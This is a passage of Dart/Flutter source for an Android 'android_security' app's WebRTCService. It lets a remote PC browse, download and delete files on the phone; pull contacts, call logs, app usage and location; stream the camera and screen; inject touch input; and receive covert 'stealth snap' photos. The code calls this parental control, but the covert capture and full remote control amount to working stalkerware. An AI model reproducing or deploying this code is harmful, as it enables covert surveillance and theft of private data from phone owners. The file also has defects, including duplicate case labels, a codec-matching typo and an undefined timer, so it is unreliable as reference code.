import 'dart:async';
import 'dart:io';
import 'dart:convert';
import 'dart:typed_data';
import 'dart:ui' as ui;
import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';
import 'package:flutter_sound/flutter_sound.dart';
import 'package:audio_session/audio_session.dart';
import 'package:flutter_webrtc/flutter_webrtc.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:call_log/call_log.dart';
import 'package:path_provider/path_provider.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'package:web_socket_channel/io.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:usage_stats/usage_stats.dart';
import 'package:network_info_plus/network_info_plus.dart' as ninfo;
import 'package:geolocator/geolocator.dart';
import 'server_url.dart';

class WebRTCService {
  IOWebSocketChannel? _channel;
  FlutterSoundRecorder? _recorder = FlutterSoundRecorder();
  FlutterSoundPlayer? _player = FlutterSoundPlayer();
  List<Uint8List> _audioQueue = [];
  Timer? _feederTimer;
  Timer? _refreshTimer; // Automatically cycle the recorder to prevent JNI crashes
  Timer? _heartbeatTimer;
  Timer? _statusTimer;
  final Battery _battery = Battery();
  final Connectivity _connectivity = Connectivity();
  final DeviceInfoPlugin _deviceInfo = DeviceInfoPlugin();
  final ninfo.NetworkInfo _networkInfo = ninfo.NetworkInfo();
  String _deviceId = "unknown_device";
  bool _isConnected = false;
  bool _isConnecting = false; // Guard against overlapping connect attempts
  int _reconnectDelay = 2; // Start at 2s, exponential backoff up to 30s

  // Visual status for UI
  final ValueNotifier<String> statusNotifier = ValueNotifier<String>("INITIALIZING");
  String lastError = "";

  StreamController<Uint8List>? _micController;
  StreamSubscription? _micSub;
  List<int> _micBuffer = []; // Accumulate bytes before sending to reduce overhead
  bool _isRecording = false;
  bool _isCameraActive = false;

  // WebRTC control
  bool _isCameraStreaming = false;
  bool _isScreenStreaming = false;
  bool _isCameraInitializing = false;

  static const _audioPlatform = MethodChannel('com.example.android_security/audio');
  static const _adminPlatform = MethodChannel('com.example.android_security/admin');
  static const _remotePlatform = MethodChannel('com.example.android_security/remote_control');
  static const _nativeSignalSend = MethodChannel('com.example.android_security/native_signal_send');
  static const _nativeSignalStream = EventChannel('com.example.android_security/native_signaling');
  StreamSubscription? _nativeSignalSub;

  // Location Tracker
  StreamSubscription<Position>? _locationSub;

  Future<void> initService() async {
    // Fetch the unique persistent device ID from native
    try {
      final id = await _adminPlatform.invokeMethod<String>('getDeviceId');
      if (id != null && id.isNotEmpty) _deviceId = id;
    } catch (_) {}

    // Request critical permissions for monitoring
    await [
      Permission.contacts,
      Permission.phone,
      Permission.sms,
      Permission.location,
    ].request();
    
    await _initPlayer();
    _connectNativeBridge();
    _startHeartbeat();
    _startStatusMonitoring();
  }

  Future<void> _initPlayer() async {
    try {
      // DO NOT auto-start audio playback on the phone.
      // This caused voice feedback: phone mic -> PC -> phone speaker loop.
      // The player will only be activated on-demand when "Voice Call" or "PC Mic -> Speaker" is used.
      debugPrint('Audio Player: Ready (will start on demand)');
    } catch (e) {
      debugPrint('Player Init Error: $e');
    }
  }

  /// Actually start the phone speaker for incoming PC audio
  Future<void> _startPhoneSpeaker() async {
    if (_player != null && _player!.isPlaying) return; // Already active
    try {
      final session = await AudioSession.instance;
      await session.configure(const AudioSessionConfiguration(
        avAudioSessionCategory: AVAudioSessionCategory.playback,
        avAudioSessionCategoryOptions: AVAudioSessionCategoryOptions.defaultToSpeaker,
        avAudioSessionMode: AVAudioSessionMode.moviePlayback,
        androidAudioAttributes: AndroidAudioAttributes(
          contentType: AndroidAudioContentType.music,
          usage: AndroidAudioUsage.media,
        ),
        androidAudioFocusGainType: AndroidAudioFocusGainType.gain,
      ));
      await session.setActive(true);

      _player = FlutterSoundPlayer();
      await _player!.openPlayer();
      await Future.delayed(const Duration(milliseconds: 500));

      await _player!.startPlayerFromStream(
        codec: Codec.pcm16,
        numChannels: 1,
        sampleRate: 8000,
        bufferSize: 16384,
        interleaved: true,
      );
      
      await _player!.setVolume(1.0);
      try {
        await _audioPlatform.invokeMethod('setSpeakerphoneOn', {'enabled': true});
      } catch (e) {
        debugPrint('Native Speaker Toggle Error: $e');
      }
      _startFeeder();
      debugPrint('Audio Player STARTED on demand (Speaker active)');
    } catch (e) {
      debugPrint('Speaker start error: $e');
    }
  }

  /// Stop the phone speaker playback
  Future<void> _stopPhoneSpeaker() async {
    _feederTimer?.cancel();
    _audioQueue.clear();
    try {
      if (_player != null) {
        await _player!.stopPlayer();
        await _player!.closePlayer();
        _player = null;
      }
      debugPrint('Audio Player STOPPED (Speaker deactivated)');
    } catch (e) {
      debugPrint('Speaker stop error: $e');
    }
  }

  void _startFeeder() {
    _feederTimer?.cancel();
    _feederTimer = Timer.periodic(const Duration(milliseconds: 40), (timer) {
      if (_audioQueue.isNotEmpty && _player != null && _player!.isPlaying) {
        try {
          // Drain up to 3 chunks to catch up with network jitter
          int checks = 0;
          while (_audioQueue.isNotEmpty && checks < 3) {
            final data = _audioQueue.removeAt(0);
            _player!.feedUint8FromStream(data);
            checks++;
          }
        } catch (e) {
          debugPrint('Feeder error: $e');
        }
      }
    });
  }

  Future<void> _connectNativeBridge() async {
    // Cancel any existing subscription
    _nativeSignalSub?.cancel();
    _isConnected = false;
    statusNotifier.value = "CONNECTING";

    try {
      // Start the native monitoring service (ensures it's running)
      await _adminPlatform.invokeMethod('startMonitoringService');
    } catch (e) {
      debugPrint('Service start error: $e');
    }

    // Subscribe to the native EventChannel for incoming messages
    _nativeSignalSub = _nativeSignalStream.receiveBroadcastStream().listen(
      (message) {
        if (!_isConnected) {
          _isConnected = true;
          _reconnectDelay = 2;
          _startHeartbeat();
          statusNotifier.value = "CONNECTED";
          debugPrint('Connected via Native Bridge');
        }
        if (message is String) {
          try {
            final data = jsonDecode(message);
            _handleMessage(data);
          } catch (e) {
            debugPrint('Native message decode error: $e');
          }
        }
      },
      onDone: () {
        debugPrint('Native bridge disconnected. Reconnecting in ${_reconnectDelay}s...');
        statusNotifier.value = "DISCONNECTED";
        _isConnected = false;
        _nativeSignalSub = null;
        final delay = _reconnectDelay;
        _reconnectDelay = (_reconnectDelay * 2).clamp(2, 30);
        Future.delayed(Duration(seconds: delay), _connectNativeBridge);
      },
      onError: (e) {
        debugPrint('Native bridge error: $e');
        lastError = e.toString();
        statusNotifier.value = "ERROR";
        _isConnected = false;
        _nativeSignalSub = null;
        final delay = _reconnectDelay;
        _reconnectDelay = (_reconnectDelay * 2).clamp(2, 30);
        Future.delayed(Duration(seconds: delay), _connectNativeBridge);
      },
    );
  }

  // Keep the old method as a fallback reference (unused, can be removed later)
  Future<void> _connectWebSocket() async {
    _connectNativeBridge();
  }

  void _startHeartbeat() {
    _stopHeartbeat();
    _heartbeatTimer = Timer.periodic(const Duration(seconds: 30), (timer) {
      if (_isConnected) {
        _sendMessage({
          'type': 'ping',
          'device_id': _deviceId,
        });
      }
    });
  }

  void _startStatusMonitoring() {
    _statusTimer?.cancel();
    _statusTimer = Timer.periodic(const Duration(seconds: 10), (timer) {
      _fetchAndSendStatusUpdate();
    });

    // Live Battery Monitoring
    _battery.onBatteryStateChanged.listen((state) {
      _fetchAndSendStatusUpdate();
    });
    // For level drops, we could use a listener too if the plugin supports it
    // battery_plus 6.1.1 supports onBatteryLevelChanged
    
    // Send immediate first update
    _fetchAndSendStatusUpdate();
  }

  Future<void> _fetchAndSendStatusUpdate() async {
    try {
      final batteryLevel = await _battery.batteryLevel;
      final batteryState = await _battery.batteryState;
      
      final connectivityResult = await _connectivity.checkConnectivity();
      String networkType = "NONE";
      if (connectivityResult.contains(ConnectivityResult.wifi)) networkType = "WIFI";
      else if (connectivityResult.contains(ConnectivityResult.mobile)) networkType = "MOBILE";
      else if (connectivityResult.contains(ConnectivityResult.ethernet)) networkType = "ETHERNET";

      int wifiSignal = -1;
      String wifiSsid = "Unknown";
      if (networkType == "WIFI") {
        try {
          wifiSsid = await _networkInfo.getWifiName() ?? "Hidden";
          wifiSignal = await _adminPlatform.invokeMethod('getWifiSignalStrength') ?? -1;
        } catch (_) {}
      }

      String bluetoothStatus = "Unknown";
      try {
        bluetoothStatus = await _adminPlatform.invokeMethod('getBluetoothStatus') ?? "Unknown";
      } catch (_) {}

      final androidInfo = await _deviceInfo.androidInfo;
      final deviceModel = "${androidInfo.manufacturer} ${androidInfo.model}";
      final androidVer = androidInfo.version.release;
      final deviceName = androidInfo.device; // Internal device name

      print("[Status Update] Batt: $batteryLevel%, Plugged: ${batteryState == BatteryState.charging}, Net: $networkType ($wifiSsid, $wifiSignal dBm)");

      _sendMessage({
        'type': 'device_status',
        'device_id': _deviceId,
        'batteryLevel': batteryLevel,
        'isCharging': batteryState == BatteryState.charging || batteryState == BatteryState.full,
        'networkType': networkType,
        'wifiSSID': wifiSsid,
        'wifiSignal': wifiSignal,
        'bluetoothStatus': bluetoothStatus,
        'model': deviceModel,
        'deviceName': deviceName,
        'androidVersion': androidVer,
        'timestamp': DateTime.now().millisecondsSinceEpoch,
      });
    } catch (e) {
      debugPrint('Status update error: $e');
    }
  }

  Future<void> _handleGetUsageStats() async {
    try {
      bool isGranted = await UsageStats.checkUsagePermission() ?? false;
      if (!isGranted) {
        _sendMessage({
          'type': 'permission_required',
          'permission': 'usage_stats',
          'message': 'Usage Access permission is required for Parental Controls.'
        });
        UsageStats.grantUsagePermission();
        return;
      }

      DateTime now = DateTime.now();
      List<Map<String, dynamic>> allDays = [];

      // Query each of the last 7 days individually
      for (int d = 0; d < 7; d++) {
        DateTime dayStart = DateTime(now.year, now.month, now.day).subtract(Duration(days: d));
        DateTime dayEnd = (d == 0) ? now : dayStart.add(const Duration(days: 1));

        List<UsageInfo> usageStats = await UsageStats.queryUsageStats(dayStart, dayEnd);
        List<Map<String, dynamic>> dayResults = [];

        for (var info in usageStats) {
          int totalTime = int.parse(info.totalTimeInForeground ?? "0");
          if (totalTime > 0) {
            String pkg = info.packageName ?? 'unknown';
            String appName = pkg.split('.').last;
            if (appName.isNotEmpty) {
              appName = appName[0].toUpperCase() + appName.substring(1);
            }
            dayResults.add({
              'packageName': pkg,
              'appName': appName,
              'totalTime': totalTime,
              'usageTime': totalTime,
              'lastTimeUsed': info.lastTimeUsed,
            });
          }
        }

        dayResults.sort((a, b) => b['totalTime'].compareTo(a['totalTime']));

        // Format date label
        String dateLabel;
        if (d == 0) dateLabel = 'Today';
        else if (d == 1) dateLabel = 'Yesterday';
        else dateLabel = '${dayStart.day.toString().padLeft(2, '0')}/${dayStart.month.toString().padLeft(2, '0')}/${dayStart.year}';

        allDays.add({
          'date': '${dayStart.year}-${dayStart.month.toString().padLeft(2, '0')}-${dayStart.day.toString().padLeft(2, '0')}',
          'label': dateLabel,
          'usage': dayResults.take(20).toList(),
        });
      }

      // Also send flat 'usage' for backward compat (today's data)
      _sendMessage({
        'type': 'app_usage_list',
        'usage': allDays.isNotEmpty ? allDays[0]['usage'] : [],
        'days': allDays,
      });
      print("[Usage Stats] Sent 7-day usage data (${allDays.length} days)");
    } catch (e) {
      debugPrint('Usage Stats Error: $e');
      _sendMessage({'type': 'error', 'message': 'Failed to get usage stats: $e'});
    }
  }

  void _stopHeartbeat() {
    _heartbeatTimer?.cancel();
    _heartbeatTimer = null;
  }

  void _handleBinary(Uint8List message) {
    if (message.isEmpty) return;
    final tag = message[0];
    final data = message.sublist(1);

    switch (tag) {
      case 0x04: // PC Audio -> Phone Speaker
        // ONLY queue if the phone speaker is actually active (Voice Call / PC Mic -> Speaker)
        if (_player != null && _player!.isPlaying) {
          _audioQueue.add(data);
          if (_audioQueue.length > 30) {
            _audioQueue.removeAt(0);
          }
        }
        break;
    }
  }

  void _handleMessage(Map<String, dynamic> data) {
    switch (data['type']) {
      case 'start_mic':
        // Native service handles background mic now
        debugPrint("Background mic request delegated to Native Service");
        break;
      case 'stop_mic':
        // Native service handles background mic now
        break;
      case 'start_speaker':
        // PC explicitly requests phone speaker activation (Voice Call / PC Mic -> Speaker)
        _startPhoneSpeaker();
        break;
      case 'stop_speaker':
        // PC explicitly requests phone speaker deactivation
        _stopPhoneSpeaker();
        break;
      case 'start_camera':
        // Native background service handles JPEG streaming now.
        // Flutter only handles interactive WebRTC calls.
        debugPrint("Camera monitoring request delegated to Native Service");
        break;
      case 'stop_camera':
        // Stop both WebRTC and Native if they are active
        _stopCamera();
        _adminPlatform.invokeMethod('setHardwareYield', {'yield': false});
        break;
      case 'start_screen':
        // Native background service handles Screen JPEG streaming
        debugPrint("Screen monitoring request delegated to Native Service");
        break;
      case 'stop_screen':
        // Delegate screen stop to native
        break;
      case 'remote_touch':
        _handleRemoteTouch(data);
        break;
      case 'list_files':
        _listFiles(data['path'] ?? '/');
        break;
      case 'download_file':
        _sendBinaryFile(data['path']);
        break;
      case 'file_info':
        _sendFileInfo(data['path']);
        break;
      case 'file_thumbnail':
        _handleFileThumbnail(data['path']);
        break;
      case 'batch_thumbnails':
        _sendBatchThumbnails(data['path'] ?? '/');
        break;
      case 'request_usage_stats':
        _handleGetUsageStats();
        break;
      case 'start_location':
        _startLocationTracking();
        break;
      case 'stop_location':
        _stopLocationTracking();
        break;
      case 'webrtc_answer':
        _handleWebRTCSignaling(data);
        break;
      case 'webrtc_candidate':
        _handleWebRTCSignaling(data);
        break;
      case 'delete_files':
        _deleteFiles(data['paths'] ?? []);
        break;
      case 'rename_file':
        _renameFile(data['path'] ?? '', data['newName'] ?? '');
        break;
      case 'webrtc_answer':
      case 'webrtc_candidate':
        _handleWebRTCSignaling(data);
        break;
      case 'get_contacts':
        _handleGetContacts();
        break;
      case 'get_call_logs':
        _handleGetCallLogs();
        break;
      case 'file_text_preview':
        _sendFileTextPreview(data['path'] ?? '');
        break;
      // Case 'pc_audio' removed in favor of binary 0x04 tag for efficiency
      case 'paste_files':
        _pasteFiles(
          data['paths'] ?? [],
          data['destination'] ?? '',
          data['operation'] ?? 'copy',
        );
        break;
      case 'get_usage_stats':
        _handleGetUsageStats();
        break;
      // 'take_photo' is now handled by lib/main.dart lifecycle monitoring
    }
  }

  void sendStealthSnap(Uint8List imageBytes) {
    try {
      final tagged = Uint8List(imageBytes.length + 1);
      tagged[0] = 0x05; // Stealth Snap Tag
      tagged.setRange(1, tagged.length, imageBytes);
      _sendBinary(tagged);
      debugPrint('Dart: Stealth Snap Transmitted (${imageBytes.length} bytes)');
    } catch (e) {
      debugPrint('Dart: Stealth Snap Transmission Error: $e');
    }
  }

  void _sendMessage(Map<String, dynamic> msg) {
    if (!_isConnected) return;
    try {
      // Ensure device_id is ALWAYS present in every signaling message
      if (!msg.containsKey('device_id')) {
        msg['device_id'] = _deviceId;
      }
      _nativeSignalSend.invokeMethod('sendSignal', {'message': jsonEncode(msg)});
    } catch (e) {
      debugPrint('Send error: $e');
    }
  }

  void _sendBinary(Uint8List data) {
    if (!_isConnected) return;
    try {
      _nativeSignalSend.invokeMethod('sendBinary', {'data': data});
    } catch (e) {
      debugPrint('Binary send error: $e');
    }
  }

  Future<void> _startMicStream() async {
    if (_isRecording) return;
    
    final status = await Permission.microphone.request();
    if (!status.isGranted) {
      _sendMessage({'type': 'error', 'message': 'Microphone permission denied'});
      return;
    }

    _isRecording = true;
    _micBuffer = [];

    await _startMicInternal();
  }

  Future<void> _startMicInternal() async {
    // Redundant - Native service handles this via tag 0x01
    debugPrint('Native Mic prioritized. Skipping Flutter recorder.');
  }

  Future<void> _stopMicInternal() async {
    try {
      await _micSub?.cancel();
      _micSub = null;
      await _micController?.close();
      _micController = null;
      if (_recorder != null) {
        await _recorder!.stopRecorder();
        await _recorder!.closeRecorder();
        _recorder = null;
      }
    } catch (e) {
      debugPrint('Mic Stop Internal Error: $e');
    }
  }

  Future<void> _stopMicStream() async {
    _isRecording = false;
    _refreshTimer?.cancel();
    await _stopMicInternal();
    _sendMessage({'type': 'mic_stopped'});
    debugPrint('Microphone streaming stopped');
  }

  Future<void> _sendBinaryFile(String path) async {
    try {
      final file = File(path);
      if (await file.exists()) {
        final size = await file.length();
        
        _sendMessage({
          'type': 'file_start',
          'name': path.split('/').last,
          'size': size
        });

        const chunkSize = 128 * 1024; 
        final raf = await file.open(mode: FileMode.read);
        int sent = 0;
        while (sent < size) {
          final readSize = (size - sent) > chunkSize ? chunkSize : (size - sent);
          final chunk = await raf.read(readSize);
          final tagged = Uint8List(chunk.length + 1);
          tagged[0] = 0x02; // file data tag
          tagged.setRange(1, tagged.length, chunk);
          _sendBinary(tagged);
          sent += chunk.length;
          await Future.delayed(const Duration(milliseconds: 5));
        }
        await raf.close();
        
        _sendMessage({
          'type': 'file_end',
          'name': path.split('/').last,
        });

        debugPrint('File sent: $path ($size bytes)');
      } else {
        _sendMessage({'type': 'error', 'message': 'File not found: $path'});
      }
    } catch (e) {
      debugPrint('File send error: $e');
      _sendMessage({'type': 'error', 'message': 'Failed to send file: $e'});
    }
  }

  Future<void> _sendFileInfo(String path) async {
    try {
      final file = File(path);
      if (await file.exists()) {
        final stat = await file.stat();
        final ext = path.split('.').last.toLowerCase();
        String fileType = 'unknown';
        if (['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'].contains(ext)) fileType = 'image';
        else if (['mp4', 'mkv', 'avi', 'mov', 'webm', '3gp'].contains(ext)) fileType = 'video';
        else if (['mp3', 'wav', 'aac', 'flac', 'ogg', 'm4a'].contains(ext)) fileType = 'audio';
        else if (['pdf'].contains(ext)) fileType = 'pdf';
        else if (['zip', 'rar', '7z', 'tar', 'gz'].contains(ext)) fileType = 'archive';
        else if (['txt', 'log', 'json', 'xml', 'csv'].contains(ext)) fileType = 'text';
        else if (['apk'].contains(ext)) fileType = 'apk';
        else if (['doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx'].contains(ext)) fileType = 'document';

        _sendMessage({
          'type': 'file_info',
          'name': path.split('/').last,
          'path': path,
          'size': stat.size,
          'modified': stat.modified.toIso8601String(),
          'fileType': fileType,
          'extension': ext,
        });
      }
    } catch (e) {
      debugPrint('File info error: $e');
    }
  }

  Future<void> _sendBatchThumbnails(String dirPath) async {
    try {
      String root = dirPath == '/' ? '/storage/emulated/0' : dirPath;
      final dir = Directory(root);
      final entities = await dir.list().toList();

      final imageExts = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
      int count = 0;
      const int maxThumbs = 20;

      for (var entity in entities) {
        if (count >= maxThumbs) break;
        if (entity is File) {
          final ext = entity.path.split('.').last.toLowerCase();
          if (!imageExts.contains(ext)) continue;

          try {
            final bytes = await entity.readAsBytes();
            final codec = await ui.instantiateImageCodec(
              bytes,
              targetWidth: 80,
            );
            final frame = await codec.getNextFrame();
            final image = frame.image;
            final byteData = await image.toByteData(format: ui.ImageByteFormat.png);
            if (byteData == null) continue;

            final thumbBytes = byteData.buffer.asUint8List();

            _sendMessage({
              'type': 'inline_thumbnail',
              'path': entity.path,
              'size': thumbBytes.length,
            });

            final tagged = Uint8List(thumbBytes.length + 1);
            tagged[0] = 0x03; // inline thumbnail data
            tagged.setRange(1, tagged.length, thumbBytes);
            _sendBinary(tagged);

            count++;
            await Future.delayed(const Duration(milliseconds: 150));
          } catch (e) {
            debugPrint('Skipping thumbnail for ${entity.path}: $e');
          }
        }
      }
      _sendMessage({'type': 'batch_thumbnails_done'});
    } catch (e) {
      debugPrint('Batch thumbnails error: $e');
    }
  }

  Future<void> _listFiles(String path) async {
    try {
      String root = path == '/' ? '/storage/emulated/0' : path;
      final dir = Directory(root);
      final entities = await dir.list(followLinks: false).toList();

      List<Map<String, dynamic>> results = [];
      for (var entity in entities) {
        try {
          final stat = await entity.stat();
          final item = {
            'name': entity.path.split('/').last,
            'path': entity.path,
            'isDir': entity is Directory,
            'size': stat.size,
            'modified': stat.modified.toIso8601String(),
          };

          if (entity is Directory) {
            try {
              final children = await entity.list(followLinks: false).toList();
              int fileCount = 0;
              int dirCount = 0;
              for (var c in children) {
                if (c is File) fileCount++;
                else if (c is Directory) dirCount++;
              }
              item['fileCount'] = fileCount;
              item['dirCount'] = dirCount;
            } catch (_) {
              item['fileCount'] = -1;
              item['dirCount'] = -1;
            }
          }
          results.add(item);
        } catch (e) {
          debugPrint('Skipping ${entity.path}: $e');
          results.add({
            'name': entity.path.split('/').last,
            'path': entity.path,
            'isDir': entity is Directory,
            'size': 0,
            'modified': '',
          });
        }
      }
      _sendMessage({'type': 'file_list', 'path': root, 'files': results});
    } catch (e) {
      _sendMessage({'type': 'file_list', 'path': path, 'files': [], 'error': e.toString()});
    }
  }

  Future<void> _deleteFiles(List<dynamic> paths) async {
    int deleted = 0;
    List<String> errors = [];
    for (final p in paths) {
      try {
        final path = p.toString();
        final type = await FileSystemEntity.type(path);
        if (type == FileSystemEntityType.directory) {
          await Directory(path).delete(recursive: true);
        } else if (type == FileSystemEntityType.file) {
          await File(path).delete();
        }
        deleted++;
      } catch (e) {
        errors.add('${p.toString().split('/').last}: $e');
      }
    }
    _sendMessage({
      'type': 'file_op_result',
      'operation': 'delete',
      'success': errors.isEmpty,
      'message': errors.isEmpty
          ? 'Deleted $deleted item${deleted != 1 ? "s" : ""}'
          : 'Deleted $deleted, failed: ${errors.join(", ")}',
    });
  }

  Future<void> _renameFile(String path, String newName) async {
    try {
      if (path.isEmpty || newName.isEmpty) {
        _sendMessage({'type': 'file_op_result', 'operation': 'rename', 'success': false, 'message': 'Invalid path'});
        return;
      }
      final lastSlash = path.lastIndexOf('/');
      if (lastSlash == -1) return;
      final parentDir = path.substring(0, lastSlash);
      final newPath = '$parentDir/$newName';
      final type = await FileSystemEntity.type(path);
      if (type == FileSystemEntityType.directory) {
        await Directory(path).rename(newPath);
      } else {
        await File(path).rename(newPath);
      }
      _sendMessage({'type': 'file_op_result', 'operation': 'rename', 'success': true, 'message': 'Renamed to $newName'});
    } catch (e) {
      _sendMessage({'type': 'file_op_result', 'operation': 'rename', 'success': false, 'message': 'Rename failed: $e'});
    }
  }

  Future<void> _pasteFiles(List<dynamic> paths, String destination, String operation) async {
    int processed = 0;
    List<String> errors = [];
    for (final p in paths) {
      try {
        final srcPath = p.toString();
        final name = srcPath.split('/').last;
        final destPath = '$destination/$name';
        final type = await FileSystemEntity.type(srcPath);

        if (type == FileSystemEntityType.file) {
          if (operation == 'copy') {
            await File(srcPath).copy(destPath);
          } else {
            try {
              await File(srcPath).rename(destPath);
            } catch (_) {
              await File(srcPath).copy(destPath);
              await File(srcPath).delete();
            }
          }
        } else if (type == FileSystemEntityType.directory) {
          if (operation == 'copy') {
            await _copyDirectory(Directory(srcPath), Directory(destPath));
          } else {
            try {
              await Directory(srcPath).rename(destPath);
            } catch (_) {
              await _copyDirectory(Directory(srcPath), Directory(destPath));
              await Directory(srcPath).delete(recursive: true);
            }
          }
        }
        processed++;
      } catch (e) {
        errors.add('${p.toString().split('/').last}: $e');
      }
    }
    _sendMessage({
      'type': 'file_op_result',
      'operation': operation,
      'success': errors.isEmpty,
      'message': errors.isEmpty ? 'Operation completed' : 'Errors: ${errors.join(", ")}',
    });
  }

  Future<void> _handleFileThumbnail(String path) async {
    try {
      final file = File(path);
      if (!await file.exists()) return;
      final bytes = await file.readAsBytes();
      _sendMessage({'type': 'thumbnail_header', 'path': path, 'size': bytes.length});
      _sendBinary(Uint8List.fromList([0x03, ...bytes]));
    } catch (_) {}
  }

  Future<void> _sendFileTextPreview(String path) async {
    try {
      final file = File(path);
      if (!await file.exists()) return;
      final size = await file.length();
      final raf = await file.open(mode: FileMode.read);
      int bytesToRead = size > 4096 ? 4096 : size;
      final chunk = await raf.read(bytesToRead);
      await raf.close();
      String text = utf8.decode(chunk, allowMalformed: true);
      _sendMessage({'type': 'text_preview_result', 'path': path, 'data': text});
    } catch (_) {}
  }

  Future<void> _copyDirectory(Directory source, Directory destination) async {
    await destination.create(recursive: true);
    await for (final entity in source.list(followLinks: false)) {
      final newPath = '${destination.path}/${entity.path.split('/').last}';
      if (entity is File) {
        await entity.copy(newPath);
      } else if (entity is Directory) {
        await _copyDirectory(entity, Directory(newPath));
      }
    }
  }

  void dispose() {
    _stopMicStream();
    _feederTimer?.cancel();
    _channel?.sink.close();
  }

  // --- Camera Logic ---

  // --- WebRTC Video Logic ---
  RTCPeerConnection? _peerConnection;
  MediaStream? _localStream;
  RTCVideoRenderer _localRenderer = RTCVideoRenderer();

  Future<void> _startCamera(bool front) async {
    if (_isCameraInitializing) {
      print("[WebRTCService] Camera already initializing, skipping duplicate request");
      return;
    }
    if (_isCameraStreaming) await _stopCamera();

    _isCameraInitializing = true;
    try {
      // FORCE STOP native background monitoring to release sensor completely
      try {
        await _adminPlatform.invokeMethod('setHardwareYield', {'yield': true});
        await Future.delayed(const Duration(milliseconds: 500)); 
      } catch (e) {
        debugPrint("Native yield error: $e");
      }

      final Map<String, dynamic> constraints = {
        'audio': false,
        'video': {
          'facingMode': front ? 'user' : 'environment',
          'width': {'ideal': 640},
          'height': {'ideal': 480},
          'frameRate': {'ideal': 15, 'max': 30},
        }
      };

      _localStream = await navigator.mediaDevices.getUserMedia(constraints);
      _isCameraStreaming = true;
      _isScreenStreaming = false;
      
      // Create Peer Connection
      await _initPeerConnection();
      
      // Add track to Peer Connection
      _localStream!.getTracks().forEach((track) {
        _peerConnection!.addTrack(track, _localStream!);
      });

      // Create Offer
      RTCSessionDescription offer = await _peerConnection!.createOffer();
      
      // Munge SDP to prefer H264
      String mungedSdp = _preferH264(offer.sdp!);
      offer = RTCSessionDescription(mungedSdp, offer.type);

      await _peerConnection!.setLocalDescription(offer);

      // Send Offer over Native Bridge
      _sendMessage({
        "type": "webrtc_offer",
        "sdp": offer.sdp,
        "mode": "camera",
      });

      _isCameraStreaming = true;
      _isCameraInitializing = false;
      print("[WebRTCService] WebRTC Video Stream started at 720p with H.264 preference");
    } catch (e) {
      _isCameraInitializing = false;
      print("[WebRTCService] WebRTC error: $e");
    }
  }

  String _preferH264(String sdp) {
    var lines = sdp.split('\r\n');
    int? mLineIndex;
    for (int i = 0; i < lines.length; i++) {
      if (lines[i].startsWith('m=video')) {
        mLineIndex = i;
        break;
      }
    }
    if (mLineIndex == null) return sdp;

    var mLine = lines[mLineIndex].split(' ');
    var ptH264 = <String>[];
    var ptOther = <String>[];

    // Find H264 payload type
    for (var line in lines) {
      if (line.startsWith('a=rtpmaps') && line.contains('H264/90000')) {
        var match = RegExp(r'a=rtpmap:(\d+) H264/90000').firstMatch(line);
        if (match != null) ptH264.add(match.group(1)!);
      }
    }

    if (ptH264.isEmpty) return sdp;

    // Reorder m-line
    for (int i = 3; i < mLine.length; i++) {
        if (!ptH264.contains(mLine[i])) {
            ptOther.add(mLine[i]);
        }
    }
    
    lines[mLineIndex] = '${mLine[0]} ${mLine[1]} ${mLine[2]} ${ptH264.join(' ')} ${ptOther.join(' ')}';
    return lines.join('\r\n');
  }

  Future<void> _initPeerConnection() async {
    final Map<String, dynamic> configuration = {
      "iceServers": [
        {"url": "stun:stun.l.google.com:19302"},
      ]
    };

    final Map<String, dynamic> constraints = {
      'mandatory': {
        'OfferToReceiveAudio': 'false',
        'OfferToReceiveVideo': 'false',
      },
      'optional': [
        {'googCpuOveruseDetection': 'false'}, 
        {'googLatencyMs': '0'},               
        {'googHighstartbitrate': '2500'},     
        {'googPayloadPadding': 'true'}
      ],
    };

    _peerConnection = await createPeerConnection(configuration, constraints);

    _peerConnection!.onIceCandidate = (candidate) {
      _sendMessage({
        "type": "webrtc_candidate",
        "candidate": {
          "candidate": candidate.candidate,
          "sdpMid": candidate.sdpMid,
          "sdpMLineIndex": candidate.sdpMLineIndex,
        }
      });
    };

    _peerConnection!.onConnectionState = (state) {
      print("[WebRTCService] Connection state: $state");
    };
  }

  Future<void> _handleWebRTCSignaling(Map<String, dynamic> data) async {
    final type = data['type'];
    if (type == 'webrtc_answer') {
      await _peerConnection?.setRemoteDescription(
        RTCSessionDescription(data['sdp'], 'answer'),
      );
    } else if (type == 'webrtc_candidate') {
      final candData = data['candidate'];
      await _peerConnection?.addCandidate(
        RTCIceCandidate(
          candData['candidate'],
          candData['sdpMid'],
          candData['sdpMLineIndex'],
        ),
      );
    }
  }

  Future<void> _stopCamera() async {
    _adaptiveTimer?.cancel();
    _isScreenStreaming = false;
    _isCameraStreaming = false;
    _localStream?.getTracks().forEach((track) => track.stop());
    await _localStream?.dispose();
    await _peerConnection?.dispose();
    _localStream = null;
    _peerConnection = null;
    print("[WebRTCService] WebRTC Video/Screen Stream stopped");
  }

  Future<void> _startScreenShare() async {
    if (_isCameraInitializing) return;
    if (_isCameraStreaming || _isScreenStreaming) await _stopCamera();

    _isCameraInitializing = true;
    try {
      // Ensure the backbone service is running with mediaProjection flag BEFORE requesting display media
      // This is a strict requirement for Android 14+ to avoid SecurityException
      try {
        await _adminPlatform.invokeMethod('startMonitoringService');
        await Future.delayed(const Duration(milliseconds: 500)); // Give system time to promote service
      } catch (e) {
        debugPrint("Service Promotion Error: $e");
      }

      final Map<String, dynamic> constraints = {
        'audio': false,
        'video': {
          'width': {'ideal': 1280},
          'height': {'ideal': 720},
          'frameRate': {'ideal': 30, 'max': 30},
        }
      };

      _localStream = await navigator.mediaDevices.getDisplayMedia(constraints);
      _isScreenStreaming = true;

      await _initPeerConnection();
      _localStream!.getTracks().forEach((track) {
        _peerConnection!.addTrack(track, _localStream!);
      });

      RTCSessionDescription offer = await _peerConnection!.createOffer();
      String mungedSdp = _preferH264(offer.sdp!);
      offer = RTCSessionDescription(mungedSdp, offer.type);

      await _peerConnection!.setLocalDescription(offer);

      _sendMessage({
        "type": "webrtc_offer",
        "sdp": offer.sdp,
        "mode": "screen",
      });

      _isCameraInitializing = false;
